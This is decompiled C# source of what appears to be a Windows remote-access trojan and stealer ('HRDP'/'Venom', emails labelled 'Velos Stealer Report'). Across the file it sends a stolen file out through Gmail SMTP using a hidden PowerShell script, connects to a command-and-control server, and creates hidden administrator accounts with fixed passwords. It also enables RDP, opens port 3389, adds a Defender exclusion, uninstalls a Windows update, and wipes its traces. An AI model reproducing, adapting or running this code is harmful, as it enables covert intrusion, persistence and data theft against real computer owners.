using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

internal static class Class2
{
	public delegate void Delegate1();

	private static string string_0;

	public static bool bool_0 = true;

	private static string string_1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\hrdpinst.exe";

	private static string[] string_2;

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool IsWow64Process(IntPtr hProcess, ref bool wow64Process);

	public static void smethod_0(string filepath, string email, string toemail, string password)
	{
		try
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b powershell â€“ExecutionPolicy Bypass -WindowStyle Hidden Set-ExecutionPolicy Unrestricted & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
			StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "email.bat"));
			streamWriter.WriteLine("@ECHO OFF");
			streamWriter.WriteLine("SET GmailAccount=" + email);
			streamWriter.WriteLine("SET GmailPassword=" + password);
			streamWriter.WriteLine("SET Attachment=" + filepath);
			streamWriter.WriteLine("CALL :PowerShell");
			streamWriter.WriteLine("CD /D %PowerShellDir%");
			streamWriter.WriteLine("Powershell -ExecutionPolicy Bypass -Command & '%PSScript%' '%GmailAccount%' '%GmailPassword%' '%Attachment%'");
			streamWriter.WriteLine("IF EXIST %~FN0 DEL /Q /F %~FN0");
			streamWriter.WriteLine("EXIT");
			streamWriter.WriteLine(":PowerShell");
			streamWriter.WriteLine("SET PowerShellDir=C:\\Windows\\System32\\WindowsPowerShell\\v1.0");
			streamWriter.WriteLine("SET PSScript=%temp%\\~tmpSendeMail.ps1");
			streamWriter.WriteLine("IF EXIST %PSScript% DEL /Q /F %PSScript%");
			streamWriter.WriteLine("ECHO $Username      = $args[0]>> %PSScript%");
			streamWriter.WriteLine("ECHO $EmailPassword = $args[1]>> %PSScript%");
			streamWriter.WriteLine("ECHO $Attachment    = $args[2]>> %PSScript%");
			streamWriter.WriteLine("ECHO >> %PSScript%");
			streamWriter.WriteLine("ECHO $Username    = $Username >> %PSScript%");
			streamWriter.WriteLine("ECHO $EmailTo     = " + toemail + " >> %PSScript%");
			streamWriter.WriteLine("ECHO $EmailFrom   = " + email + " >> %PSScript%");
			streamWriter.WriteLine("ECHO $Subject     = Velos Stealer Report >> %PSScript%");
			streamWriter.WriteLine("ECHO $Body        = Velos download >> %PSScript%");
			streamWriter.WriteLine("ECHO $SMTPServer  = smtp.gmail.com >> %PSScript%");
			streamWriter.WriteLine("ECHO $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body) >> %PSScript%");
			streamWriter.WriteLine("ECHO $Attachment  = New-Object System.Net.Mail.Attachment($Attachment) >> %PSScript%");
			streamWriter.WriteLine("ECHO $SMTPMessage.Attachments.Add($Attachment) >> %PSScript%");
			streamWriter.WriteLine("ECHO $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) >> %PSScript%");
			streamWriter.WriteLine("ECHO $SMTPClient.EnableSsl = $true >> %PSScript%");
			streamWriter.WriteLine("ECHO $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $EmailPassword) >> %PSScript%");
			streamWriter.WriteLine("ECHO $SMTPClient.Send($SMTPMessage) >> %PSScript%");
			streamWriter.WriteLine("GOTO :EOF");
			string fileName = Path.Combine(Path.GetTempPath(), "email.bat");
			Process.Start(new ProcessStartInfo
			{
				FileName = fileName,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
		}
		catch (Exception)
		{
		}
	}

	private static void smethod_1()
	{
		try
		{
			TcpClient tcpClient = new TcpClient(string_2[0], Convert.ToInt32(string_2[1]));
			NetworkStream stream = tcpClient.GetStream();
			byte[] bytes = Encoding.ASCII.GetBytes("HRDP-SOC:\r\n\r\n");
			stream.Write(bytes, 0, bytes.Length);
			stream.Flush();
			Class3.smethod_0(tcpClient, smethod_1);
		}
		catch (Exception)
		{
			smethod_2();
		}
	}

	public static void smethod_2()
	{
		bool_0 = false;
		smethod_7();
		smethod_8(string_0);
		smethod_4(string_0);
		smethod_3(string_0);
		Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("dontdisplaylastusername", 0);
		Application.Exit();
	}

	public static void smethod_3(string username)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			DirectoryEntry val = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
			DirectoryEntry val2 = val.get_Children().Find(username, "user");
			val.get_Children().Remove(val2);
			val2.Close();
			val.Close();
		}
		catch (Exception ex)
		{
			throw ex;
		}
	}

	public static void smethod_4(string username)
	{
		IntPtr ptr = IntPtr.Zero;
		if (smethod_5())
		{
			Wow64DisableWow64FsRedirection(ref ptr);
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo("C:\\Windows\\System32\\query.exe", "user " + username);
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.UseShellExecute = false;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		if (text != "")
		{
			try
			{
				text = text.Split(new string[1] { "\r\n" }, StringSplitOptions.None)[1].Trim();
				Console.WriteLine(text);
				text = text.Substring(text.IndexOf(" "));
				text = text.Trim();
				text = text.Substring(0, text.IndexOf(" "));
				Console.WriteLine(text);
				processStartInfo = new ProcessStartInfo("C:\\Windows\\System32\\logoff.exe", text);
				processStartInfo.CreateNoWindow = true;
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.RedirectStandardError = true;
				processStartInfo.UseShellExecute = false;
				Process process2 = new Process();
				process2.StartInfo = processStartInfo;
				process2.Start();
				text = process2.StandardOutput.ReadToEnd();
				process2.WaitForExit();
			}
			catch (Exception)
			{
			}
		}
		if (smethod_5())
		{
			Wow64RevertWow64FsRedirection(ptr);
		}
	}

	public static bool smethod_5()
	{
		if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) || Environment.OSVersion.Version.Major >= 6)
		{
			using (Process process = Process.GetCurrentProcess())
			{
				bool wow64Process = false;
				if (!IsWow64Process(process.Handle, ref wow64Process))
				{
					return false;
				}
				return wow64Process;
			}
		}
		return false;
	}

	public static bool smethod_6()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo(string_1, "-i -o");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.UseShellExecute = false;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		if (text != "")
		{
			if (text.ToLower().Contains("terminal services is not supported."))
			{
				return false;
			}
			if (text.ToLower().Contains("terminal services is fully supported."))
			{
				return true;
			}
			return false;
		}
		return false;
	}

	public static bool smethod_7()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo(string_1, "-u");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.UseShellExecute = false;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		if (text == null)
		{
			return true;
		}
		return false;
	}

	public static bool smethod_8(string name)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c net user " + name + " /delete");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.UseShellExecute = false;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		if (text != "")
		{
			if (text.ToLower().Contains("command completed successfully."))
			{
				return true;
			}
			return false;
		}
		return false;
	}

	public static bool smethod_9(string name)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c net user " + name + " " + name + " /add");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.UseShellExecute = false;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		if (text != "")
		{
			if (text.ToLower().Contains("command completed successfully."))
			{
				processStartInfo = new ProcessStartInfo("cmd.exe", "/c net localgroup administrators " + name + " /add");
				processStartInfo.CreateNoWindow = true;
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.RedirectStandardError = true;
				processStartInfo.UseShellExecute = false;
				Process process2 = new Process();
				process2.StartInfo = processStartInfo;
				process2.Start();
				text = process2.StandardOutput.ReadToEnd();
				process2.WaitForExit();
				if (text != "" && text.ToLower().Contains("command completed successfully."))
				{
					return true;
				}
				return false;
			}
			return false;
		}
		return false;
	}

	public static string smethod_10()
	{
		string text = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ";
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		for (int i = 1; i <= 10; i++)
		{
			int index = random.Next(0, text.Length);
			char value = text[index];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static void smethod_11(string user)
	{
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0408: Unknown result type (might be due to invalid IL or missing references)
		//IL_040f: Expected O, but got Unknown
		//IL_048d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0494: Expected O, but got Unknown
		//IL_06f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f9: Expected O, but got Unknown
		//IL_0777: Unknown result type (might be due to invalid IL or missing references)
		//IL_077e: Expected O, but got Unknown
		switch (Environment.OSVersion.Version.Major)
		{
		case 6:
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey2 == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey2.SetValue("dontdisplaylastusername", 1);
			}
			else
			{
				registryKey2.SetValue("dontdisplaylastusername", 1);
			}
			registryKey2.Flush();
			if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true) == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true)!.SetValue("DWORD", 2);
			}
			else
			{
				registryKey2.SetValue("DWORD", 2);
			}
			registryKey2.Flush();
			PrincipalContext val4 = null;
			try
			{
				Console.WriteLine("Building System Information");
				val4 = new PrincipalContext((ContextType)0, (string)null);
			}
			catch (Exception ex4)
			{
				Console.WriteLine("Failed to create System Context.");
				Console.WriteLine("Exception: " + ex4);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Checking if User Exists.");
			if (UserPrincipal.FindByIdentity(val4, user) != null)
			{
				Console.WriteLine(user + " already exists. Exiting!!");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Building User Information");
			UserPrincipal val5 = new UserPrincipal(val4);
			((Principal)val5).set_Name(user);
			((Principal)val5).set_DisplayName("Venom Administrative User");
			((AuthenticablePrincipal)val5).set_PasswordNeverExpires(true);
			((AuthenticablePrincipal)val5).SetPassword(user);
			((AuthenticablePrincipal)val5).set_Enabled((bool?)true);
			try
			{
				Console.WriteLine("Creating New User");
				((Principal)val5).Save();
			}
			catch (Exception ex5)
			{
				Console.WriteLine("Failed to create user.");
				Console.WriteLine("Exception: " + ex5);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			GroupPrincipal val6 = null;
			try
			{
				val6 = GroupPrincipal.FindByIdentity(val4, "Administrators");
				if (val6 != null)
				{
					Console.WriteLine("Checking if itadmin is part of Administrators Group");
					if (val6.get_Members().Contains(val4, (IdentityType)0, user))
					{
						Console.WriteLine("Administrators already contains " + user);
						break;
					}
					Console.WriteLine("Adding itadmin to Administrators Group");
					val6.get_Members().Add(val5);
					((Principal)val6).Save();
					break;
				}
				Console.WriteLine("Could not find the group Administrators");
			}
			catch (Exception ex6)
			{
				Console.WriteLine("Exception adding user to group.");
				Console.WriteLine("Exception: " + ex6);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
			}
			Console.WriteLine("Cleaning Up");
			((Principal)val6).Dispose();
			((Principal)val5).Dispose();
			val4.Dispose();
			Console.WriteLine();
			Console.WriteLine("Press Any Key to Continue");
			Console.ReadLine();
			break;
		}
		case 10:
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey3 == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey3.SetValue("dontdisplaylastusername", 1);
			}
			else
			{
				registryKey3.SetValue("dontdisplaylastusername", 1);
			}
			registryKey3.Flush();
			if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true) == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true)!.SetValue("DWORD", 2);
			}
			else
			{
				registryKey3.SetValue("DWORD", 2);
			}
			registryKey3.Flush();
			string text2 = "Venom";
			string password2 = "Venom";
			PrincipalContext val7 = null;
			try
			{
				Console.WriteLine("Building System Information");
				val7 = new PrincipalContext((ContextType)0, (string)null);
			}
			catch (Exception ex7)
			{
				Console.WriteLine("Failed to create System Context.");
				Console.WriteLine("Exception: " + ex7);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Checking if User Exists.");
			if (UserPrincipal.FindByIdentity(val7, text2) != null)
			{
				Console.WriteLine(text2 + " already exists. Exiting!!");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Building User Information");
			UserPrincipal val8 = new UserPrincipal(val7);
			((Principal)val8).set_Name(text2);
			((Principal)val8).set_DisplayName("Venom Administrative User");
			((AuthenticablePrincipal)val8).set_PasswordNeverExpires(true);
			((AuthenticablePrincipal)val8).SetPassword(password2);
			((AuthenticablePrincipal)val8).set_Enabled((bool?)true);
			try
			{
				Console.WriteLine("Creating New User");
				((Principal)val8).Save();
			}
			catch (Exception ex8)
			{
				Console.WriteLine("Failed to create user.");
				Console.WriteLine("Exception: " + ex8);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			GroupPrincipal val9 = null;
			try
			{
				val9 = GroupPrincipal.FindByIdentity(val7, "Administrators");
				if (val9 != null)
				{
					Console.WriteLine("Checking if itadmin is part of Administrators Group");
					if (val9.get_Members().Contains(val7, (IdentityType)0, text2))
					{
						Console.WriteLine("Administrators already contains " + text2);
						break;
					}
					Console.WriteLine("Adding itadmin to Administrators Group");
					val9.get_Members().Add(val8);
					((Principal)val9).Save();
					break;
				}
				Console.WriteLine("Could not find the group Administrators");
			}
			catch (Exception ex9)
			{
				Console.WriteLine("Exception adding user to group.");
				Console.WriteLine("Exception: " + ex9);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
			}
			Console.WriteLine("Cleaning Up");
			((Principal)val9).Dispose();
			((Principal)val8).Dispose();
			val7.Dispose();
			Console.WriteLine();
			Console.WriteLine("Press Any Key to Continue");
			Console.ReadLine();
			break;
		}
		case 5:
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey.SetValue("dontdisplaylastusername", 1);
			}
			else
			{
				registryKey.SetValue("dontdisplaylastusername", 1);
			}
			registryKey.Flush();
			if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true) == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true)!.SetValue("DWORD", 2);
			}
			else
			{
				registryKey.SetValue("DWORD", 2);
			}
			registryKey.Flush();
			string text = "Venom";
			string password = "Venom";
			PrincipalContext val = null;
			try
			{
				Console.WriteLine("Building System Information");
				val = new PrincipalContext((ContextType)0, (string)null);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Failed to create System Context.");
				Console.WriteLine("Exception: " + ex);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Checking if User Exists.");
			if (UserPrincipal.FindByIdentity(val, text) != null)
			{
				Console.WriteLine(text + " already exists. Exiting!!");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Building User Information");
			UserPrincipal val2 = new UserPrincipal(val);
			((Principal)val2).set_Name(text);
			((Principal)val2).set_DisplayName("Venom Administrative User");
			((AuthenticablePrincipal)val2).set_PasswordNeverExpires(true);
			((AuthenticablePrincipal)val2).SetPassword(password);
			((AuthenticablePrincipal)val2).set_Enabled((bool?)true);
			try
			{
				Console.WriteLine("Creating New User");
				((Principal)val2).Save();
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Failed to create user.");
				Console.WriteLine("Exception: " + ex2);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			GroupPrincipal val3 = null;
			try
			{
				val3 = GroupPrincipal.FindByIdentity(val, "Administrators");
				if (val3 != null)
				{
					Console.WriteLine("Checking if itadmin is part of Administrators Group");
					if (val3.get_Members().Contains(val, (IdentityType)0, text))
					{
						Console.WriteLine("Administrators already contains " + text);
						break;
					}
					Console.WriteLine("Adding itadmin to Administrators Group");
					val3.get_Members().Add(val2);
					((Principal)val3).Save();
					break;
				}
				Console.WriteLine("Could not find the group Administrators");
			}
			catch (Exception ex3)
			{
				Console.WriteLine("Exception adding user to group.");
				Console.WriteLine("Exception: " + ex3);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
			}
			Console.WriteLine("Cleaning Up");
			((Principal)val3).Dispose();
			((Principal)val2).Dispose();
			val.Dispose();
			Console.WriteLine();
			Console.WriteLine("Press Any Key to Continue");
			Console.ReadLine();
			break;
		}
		}
	}

	public static void smethod_12()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", writable: true);
		if (registryKey == null)
		{
			Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", writable: true);
			registryKey.SetValue("fDenyTSConnections", 0);
		}
		else
		{
			registryKey.SetValue("fDenyTSConnections", 0);
		}
		registryKey.Flush();
		RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", writable: true);
		if (registryKey2 == null)
		{
			Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey2 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", writable: true);
			registryKey2.SetValue("UserAuthentication", 1);
		}
		else
		{
			registryKey2.SetValue("UserAuthentication", 1);
		}
		registryKey2.Flush();
		RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", writable: true);
		if (registryKey3 == null)
		{
			Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", writable: true);
			registryKey3.SetValue("fSingleSessionPerUser", 0);
		}
		else
		{
			registryKey3.SetValue("fSingleSessionPerUser", 0);
		}
		registryKey3.Flush();
		RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", writable: true);
		if (registryKey4 == null)
		{
			Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey4 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", writable: true);
			registryKey4.SetValue("fSingleSessionPerUser", 0);
		}
		else
		{
			registryKey4.SetValue("fSingleSessionPerUser", 0);
		}
		registryKey4.Flush();
		try
		{
			RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", writable: true);
			if (registryKey5 != null && registryKey5.GetValue("Durios") != null)
			{
				registryKey5.SetValue("Durios", "0");
			}
			Console.WriteLine("Durios desactivated");
		}
		catch (Exception)
		{
			smethod_13("New-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -Name Durios -PropertyType DWord -Value 0 -Force");
		}
		RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", writable: true);
		if (registryKey6 == null)
		{
			Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", writable: true);
			registryKey6.SetValue("Durios", 0);
		}
		else
		{
			registryKey6.SetValue("Durios", 0);
		}
		registryKey6.Flush();
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell â€“ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell â€“ExecutionPolicy Bypass -WindowStyle Hidden -Command netsh advfirewall firewall add rule name='allow RemoteDesktop' dir=in protocol=TCP localport=3389 action=allow & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell â€“ExecutionPolicy Bypass -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %ProgramFiles%\\RDP Wrapper & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void smethod_13(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		process.Start();
	}

	public static void smethod_14()
	{
		string value = "cmd";
		string value2 = "conhost";
		string value3 = "installrdp";
		string value4 = "rdpinstall";
		string value5 = "updaterdp";
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.MainWindowTitle.Contains(value))
			{
				process.Kill();
			}
		}
		processes = Process.GetProcesses();
		foreach (Process process2 in processes)
		{
			if (process2.MainWindowTitle.Contains(value5))
			{
				process2.Kill();
			}
		}
		processes = Process.GetProcesses();
		foreach (Process process3 in processes)
		{
			if (process3.MainWindowTitle.Contains(value4))
			{
				process3.Kill();
			}
		}
		processes = Process.GetProcesses();
		foreach (Process process4 in processes)
		{
			if (process4.MainWindowTitle.Contains(value3))
			{
				process4.Kill();
			}
		}
		processes = Process.GetProcesses();
		foreach (Process process5 in processes)
		{
			if (process5.MainWindowTitle.Contains(value2))
			{
				process5.Kill();
			}
		}
	}

	public static void smethod_15()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b del /q/f/s %TEMP%\\* & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}
}
